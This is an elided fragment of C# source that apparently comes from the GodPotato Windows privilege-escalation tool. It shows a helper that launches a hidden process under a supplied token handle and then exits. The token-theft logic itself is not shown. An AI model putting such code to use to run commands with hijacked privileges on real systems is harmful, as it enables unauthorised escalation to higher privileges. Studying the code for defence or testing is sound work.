  ...
  [In] uint dwOptions
    ...
    public class TokenuUils
    {
        ...
        public static void createProcessReadOut(TextWriter consoleWriter, IntPtr tokenHandle, string commandLine)
        {
            ...
            startupInfo.dwFlags = (int)NativeMethod.STARTF_USESHOWWINDOW;
            startupInfo.wShowWindow = 0; // SW_HIDE

            // Create process without inheriting any handles (no stdout/stderr piping)
            if (CreateProcess(tokenHandle, commandLine, true, (uint)ProcessCreateFlags.CREATE_NO_WINDOW, ref startupInfo, out processInfo))
            {
                consoleWriter.WriteLine($"[*] process start with pid {processInfo.dwProcessId}");
            }
            else
            {
            ...
            // Close handles and exit immediately
            if (processInfo.hProcess != IntPtr.Zero)
            {
                NativeMethod.CloseHandle(processInfo.hProcess);
            }
            if (processInfo.hThread != IntPtr.Zero)
            {
                NativeMethod.CloseHandle(processInfo.hThread);
            }

            consoleWriter.WriteLine("[*] Command launched. Exiting GodPotato.");
            Environment.Exit(0);
        }
